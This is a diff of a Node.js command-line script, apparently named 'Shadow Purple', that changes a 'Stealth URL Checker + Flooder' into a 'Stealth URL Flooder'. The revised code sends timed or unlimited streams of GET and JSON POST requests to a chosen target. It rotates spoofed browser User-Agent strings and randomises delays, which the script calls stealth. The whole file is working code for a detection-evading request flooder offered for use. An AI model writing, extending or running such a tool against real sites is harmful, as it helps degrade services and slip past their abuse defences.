@@ -1,6 +1,7 @@
 #!/usr/bin/env node
 import * as readline from 'node:readline/promises';
 import { stdin, stdout } from 'process';
+import { URL } from 'url';
 
 const rl = readline.createInterface({ input: stdin, output: stdout });
 
@@ -8,9 +9,9 @@ const rl = readline.createInterface({ input: stdin, output: stdout });
 let DELAY_MIN = 1000;
 let DELAY_MAX = 5000;
 let GET_RATIO = 0.7;
-let TOTAL_REQUESTS = 1;
-let DURATION_MODE = false;
 let DURATION_SEC = 60;
+let MAX_REQUESTS = 0; // 0 = unlimited
+let TARGET_HOST = 'target';
 
 const USER_AGENTS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
@@ -34,7 +35,7 @@ const USER_AGENTS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0',
   'Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0',
   'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 Version/15.6 Mobile/15E148 Safari/604.1',
-  'Mozilla/5.0 (Android 10; SM-A505F) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36',
+  'Mozilla/5.0 (Android 10; SM-A505F) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_10) AppleWebKit/605.1.15 Version/16.5 Safari/605.1.15',
   'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36',
@@ -61,59 +62,24 @@ function randomDelay() {
   return Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN;
 }
 
-async function testUrl(url, count) {
-  let alive = 0;
-  let dead = 0;
-  let totalTime = 0;
-
-  for (let i = 1; i <= count; i++) {
-    const start = Date.now();
-    const ua = randomUA();
-    const method = randomMethod();
-
-    const options = {
-      method: method,
-      headers: { 'User-Agent': ua },
-      signal: AbortSignal.timeout(8000)
-    };
-
-    if (method === 'POST') {
-      options.body = JSON.stringify({ shadow: 'ping', ts: Date.now(), req: i });
-      options.headers['Content-Type'] = 'application/json';
-    }
-
-    try {
-      const res = await fetch(url, options);
-      const time = Date.now() - start;
-      totalTime += time;
-      if (res.ok) alive++; else dead++;
-      const status = res.ok? `\x1b[32m✅ ${res.status}\x1b[0m` : `\x1b[33m⚠️ ${res.status}\x1b[0m`;
-      console.log(`[${i}/${count}] ${status} | ${method} | ${time}ms`);
-    } catch (err) {
-      const time = Date.now() - start;
-      totalTime += time;
-      dead++;
-      console.log(`[${i}/${count}] \x1b[31m❌ FAIL\x1b[0m | ${method} | ${time}ms | ${err.name}`);
-    }
-
-    if (i < count) await delay(randomDelay());
-  }
-
-  return { alive, dead, avgTime: Math.round(totalTime / count), count };
-}
-
-async function testDuration(url, durationSec) {
+async function runTest(url) {
   let count = 0;
   let alive = 0;
   let dead = 0;
   let totalTime = 0;
-  const endTime = Date.now() + durationSec * 1000;
+  const startTime = Date.now();
+  const endTime = startTime + DURATION_SEC * 1000;
 
-  console.log(`\x1b[90m[Shadow] Running for ${durationSec} seconds... Ctrl+C to stop\x1b[0m\n`);
+  console.log(`\x1b[90m[Shadow] Running... Max: ${MAX_REQUESTS||'∞'} req | ${DURATION_SEC}s | Ctrl+C to stop\x1b[0m\n`);
 
-  while (Date.now() < endTime) {
+  while (true) {
+    // Stop kalau request limit kena
+    if (MAX_REQUESTS > 0 && count >= MAX_REQUESTS) break;
+    // Stop kalau durasi habis
+    if (Date.now() >= endTime) break;
+
     count++;
-    const start = Date.now();
+    const reqStart = Date.now();
     const ua = randomUA();
     const method = randomMethod();
 
@@ -130,22 +96,27 @@ async function testDuration(url, durationSec) {
 
     try {
       const res = await fetch(url, options);
-      const time = Date.now() - start;
+      const time = Date.now() - reqStart;
       totalTime += time;
       if (res.ok) alive++; else dead++;
       const status = res.ok? `\x1b[32m✅ ${res.status}\x1b[0m` : `\x1b[33m⚠️ ${res.status}\x1b[0m`;
-      console.log(`[${count}] ${status} | ${method} | ${time}ms`);
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+      console.log(`[${TARGET_HOST}] ${status} | ${method} | ${time}ms | ${elapsed}s`);
     } catch (err) {
-      const time = Date.now() - start;
+      const time = Date.now() - reqStart;
       totalTime += time;
       dead++;
-      console.log(`[${count}] \x1b[31m❌ FAIL\x1b[0m | ${method} | ${time}ms | ${err.name}`);
+      console.log(`[${TARGET_HOST}] \x1b[31m❌ FAIL\x1b[0m | ${method} | ${time}ms | ${err.name}`);
     }
 
-    await delay(randomDelay());
+    // Delay kalau masih ada waktu + request belum max
+    if ((MAX_REQUESTS === 0 || count < MAX_REQUESTS) && Date.now() < endTime) {
+      await delay(randomDelay());
+    }
   }
 
-  return { count, alive, dead, avgTime: count > 0? Math.round(totalTime / count) : 0 };
+  const duration = Math.round((Date.now() - startTime) / 1000);
+  return { count, alive, dead, avgTime: count > 0? Math.round(totalTime / count) : 0, duration };
 }
 
 function showBanner() {
@@ -156,7 +127,7 @@ function showBanner() {
   console.log('| |___| | (_) |_) | (_) | __/| |_| | ||_|');
   console.log(' \\____|_| |_|\\___/|.__/ \\___/|_| |_| \\__,_| |_(_)');
   console.log(' |_| ');
-  console.log(' v1.2 | Stealth URL Checker + Flooder');
+  console.log(' v1.0 | Stealth URL Flooder');
   console.log('\x1b[0m');
 }
 
@@ -165,9 +136,11 @@ function showResult(result, url) {
   console.log('\x1b[1m🌑 SHADOW PURPLE SUMMARY\x1b[0m');
   console.log('='.repeat(40));
   console.log(`Target : ${url}`);
+  console.log(`Limit : ${MAX_REQUESTS||'Unlimited'} req | ${DURATION_SEC}s`);
   console.log(`Total Requests : ${result.count}`);
   console.log(`ALIVE : \x1b[32m${result.alive}\x1b[0m | DEAD : \x1b[31m${result.dead}\x1b[0m`);
   console.log(`Avg Response : ${result.avgTime}ms`);
+  console.log(`Actual Duration : ${result.duration}s`);
   console.log(`Method : ${Math.round(GET_RATIO*100)}% GET / ${Math.round((1-GET_RATIO)*100)}% POST`);
   console.log('='.repeat(40) + '\n');
 }
@@ -188,15 +161,17 @@ async function setup() {
   }
   const url = urlInput.startsWith('http')? urlInput : `https://${urlInput}`;
 
-  const mode = await ask('Mode [1] Jumlah Request / [2] Durasi Detik [1] > ', '1');
-
-  if (mode === '2') {
-    DURATION_MODE = true;
-    const dur = await ask('Durasi dalam detik [60] > ', '60');
-    DURATION_SEC = parseInt(dur);
-  } else {
-    const req = await ask('Jumlah Request [1] > ', '1'); // FIX: tambah > dan spasi
+  try {
+    TARGET_HOST = new URL(url).hostname;
+  } catch {
+    TARGET_HOST = url.replace(/^https?:\/\//, '').split('/')[0];
   }
+
+  const dur = await ask('Durasi detik [60] > ', '60');
+  DURATION_SEC = parseInt(dur);
+
+  const req = await ask('Max Requests [0=unlimited] > ', '0');
+  MAX_REQUESTS = parseInt(req);
 
   const dMin = await ask('Delay Min ms > ', '1000');
   DELAY_MIN = parseInt(dMin);
@@ -214,16 +189,8 @@ async function main() {
   const url = await setup();
   if (!url) return;
 
-  console.log('\x1b[90m[Shadow] Entering stealth mode...\x1b[0m');
   await delay(randomDelay());
-
-  let result;
-  if (DURATION_MODE) {
-    result = await testDuration(url, DURATION_SEC);
-  } else {
-    result = await testUrl(url, TOTAL_REQUESTS);
-  }
-
+  const result = await runTest(url);
   showResult(result, url);
   rl.close();
 }
